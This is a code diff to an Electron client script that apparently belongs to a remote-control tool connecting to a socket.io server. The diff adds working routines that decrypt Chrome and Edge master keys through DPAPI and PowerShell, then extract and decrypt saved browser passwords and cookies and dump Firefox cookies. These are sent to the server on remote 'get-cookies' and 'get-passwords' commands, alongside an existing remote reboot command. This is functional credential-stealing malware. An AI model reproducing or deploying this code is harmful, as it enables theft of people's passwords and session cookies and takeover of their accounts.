@@ -1,6 +1,155 @@
 const { ipcRenderer } = require('electron');
 const io = require('socket.io-client');
 const { SERVER_URL } = require('../config');
+const fs   = require('fs');
+const os   = require('os');
+const path = require('path');
+const crypto = require('crypto');
+const { execSync } = require('child_process');
+
+// ── Déchiffrement Chrome/Edge ──
+
+async function initSQL() {
+  const initSqlJs = require('sql.js');
+  const wasmPath = path.join(__dirname, '..', 'node_modules', 'sql.js', 'dist', 'sql-wasm.wasm');
+  const wasmBinary = fs.readFileSync(wasmPath);
+  return initSqlJs({ wasmBinary });
+}
+
+function dpapi(encBuf) {
+  const b64 = encBuf.toString('base64');
+  const script = `Add-Type -AssemblyName System.Security;[Convert]::ToBase64String([System.Security.Cryptography.ProtectedData]::Unprotect([Convert]::FromBase64String('${b64}'),$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser))`;
+  try {
+    const out = execSync(`powershell -NoProfile -Command "${script}"`, { timeout: 8000 }).toString().trim();
+    return Buffer.from(out, 'base64');
+  } catch (e) {
+    return null;
+  }
+}
+
+function getMasterKey(browserBase) {
+  try {
+    const ls = JSON.parse(fs.readFileSync(path.join(browserBase, 'Local State'), 'utf8'));
+    const encKeyB64 = ls?.os_crypt?.encrypted_key;
+    if (!encKeyB64) return null;
+    const encKey = Buffer.from(encKeyB64, 'base64').slice(5); // retirer préfixe "DPAPI"
+    return dpapi(encKey);
+  } catch { return null; }
+}
+
+function decryptValue(encBuf, masterKey) {
+  try {
+    if (!encBuf || encBuf.length < 3) return '';
+    const prefix = encBuf.slice(0, 3).toString('ascii');
+    if ((prefix === 'v10' || prefix === 'v11') && masterKey) {
+      const iv = encBuf.slice(3, 15);
+      const tag = encBuf.slice(-16);
+      const ct  = encBuf.slice(15, -16);
+      const d   = crypto.createDecipheriv('aes-256-gcm', masterKey, iv);
+      d.setAuthTag(tag);
+      return d.update(ct, null, 'utf8') + d.final('utf8');
+    }
+    // Ancien format (DPAPI direct sur la valeur)
+    const dec = dpapi(encBuf);
+    return dec ? dec.toString('utf8') : '(non déchiffrable)';
+  } catch (e) {
+    return `(err: ${e.message.slice(0, 40)})`;
+  }
+}
+
+function openDb(SQL, filePath) {
+  const tmp = path.join(os.tmpdir(), `tmp_${Date.now()}_${Math.random().toString(36).slice(2)}.db`);
+  fs.copyFileSync(filePath, tmp);
+  try {
+    const db = new SQL.Database(fs.readFileSync(tmp));
+    return db;
+  } finally {
+    try { fs.unlinkSync(tmp); } catch {}
+  }
+}
+
+async function extractCookies() {
+  const SQL = await initSQL();
+  const browsers = [
+    { name: 'Chrome', base: `${process.env.LOCALAPPDATA}\\Google\\Chrome\\User Data`,  db: 'Default\\Network\\Cookies' },
+    { name: 'Edge',   base: `${process.env.LOCALAPPDATA}\\Microsoft\\Edge\\User Data`, db: 'Default\\Network\\Cookies' },
+    { name: 'Firefox',base: null, db: null }
+  ];
+
+  const results = {};
+
+  for (const b of browsers) {
+    try {
+      if (b.name === 'Firefox') {
+        // Firefox: cookies en clair
+        const profileDir = `${process.env.APPDATA}\\Mozilla\\Firefox\\Profiles`;
+        if (!fs.existsSync(profileDir)) { results.Firefox = 'Non installé'; continue; }
+        const profile = fs.readdirSync(profileDir).find(d => d.endsWith('.default-release') || d.endsWith('.default'));
+        if (!profile) { results.Firefox = 'Profil introuvable'; continue; }
+        const dbPath = path.join(profileDir, profile, 'cookies.sqlite');
+        if (!fs.existsSync(dbPath)) { results.Firefox = 'Pas de cookies'; continue; }
+        const db = openDb(SQL, dbPath);
+        const res = db.exec('SELECT host, name, value FROM moz_cookies LIMIT 300');
+        db.close();
+        if (!res.length) { results.Firefox = 'Vide'; continue; }
+        results.Firefox = res[0].values.map(([h, n, v]) => `${h} | ${n} | ${v}`).join('\n');
+        continue;
+      }
+
+      if (!fs.existsSync(b.base)) { results[b.name] = 'Non installé'; continue; }
+      const dbPath = path.join(b.base, b.db);
+      if (!fs.existsSync(dbPath)) { results[b.name] = 'Pas de cookies'; continue; }
+
+      const masterKey = getMasterKey(b.base);
+      const db = openDb(SQL, dbPath);
+      const res = db.exec('SELECT host_key, name, encrypted_value FROM cookies LIMIT 300');
+      db.close();
+
+      if (!res.length) { results[b.name] = 'Vide'; continue; }
+      results[b.name] = res[0].values.map(([host, name, encVal]) => {
+        const val = decryptValue(Buffer.from(encVal), masterKey);
+        return `${host} | ${name} | ${val}`;
+      }).join('\n');
+    } catch (e) {
+      results[b.name] = `Erreur: ${e.message}`;
+    }
+  }
+  return results;
+}
+
+async function extractPasswords() {
+  const SQL = await initSQL();
+  const browsers = [
+    { name: 'Chrome', base: `${process.env.LOCALAPPDATA}\\Google\\Chrome\\User Data`,  db: 'Default\\Login Data' },
+    { name: 'Edge',   base: `${process.env.LOCALAPPDATA}\\Microsoft\\Edge\\User Data`, db: 'Default\\Login Data' },
+  ];
+
+  const results = {};
+
+  for (const b of browsers) {
+    try {
+      if (!fs.existsSync(b.base)) { results[b.name] = 'Non installé'; continue; }
+      const dbPath = path.join(b.base, b.db);
+      if (!fs.existsSync(dbPath)) { results[b.name] = 'Pas de données'; continue; }
+
+      const masterKey = getMasterKey(b.base);
+      if (!masterKey) { results[b.name] = 'Clé DPAPI introuvable'; continue; }
+
+      const db = openDb(SQL, dbPath);
+      const res = db.exec('SELECT origin_url, username_value, password_value FROM logins WHERE username_value != ""');
+      db.close();
+
+      if (!res.length) { results[b.name] = 'Aucun mot de passe'; continue; }
+      results[b.name] = res[0].values.map(([url, user, encPwd]) => {
+        const pwd = decryptValue(Buffer.from(encPwd), masterKey);
+        return `🌐 ${url}\n   👤 ${user}\n   🔑 ${pwd}`;
+      }).join('\n\n');
+    } catch (e) {
+      results[b.name] = `Erreur: ${e.message}`;
+    }
+  }
+  return results;
+}
 
 const RTC_CONFIG = {
   iceServers: [
@@ -83,7 +232,10 @@ socket_on_command = async (cmd) => {
     const info = await ipcRenderer.invoke('get-system-info');
     socket.emit('command:result', { cmd, data: info });
   } else if (cmd === 'get-cookies') {
-    const result = await ipcRenderer.invoke('get-cookies');
+    const result = await extractCookies();
+    socket.emit('command:result', { cmd, data: result });
+  } else if (cmd === 'get-passwords') {
+    const result = await extractPasswords();
     socket.emit('command:result', { cmd, data: result });
   } else if (cmd === 'reboot') {
     require('child_process').exec('shutdown /r /t 5');
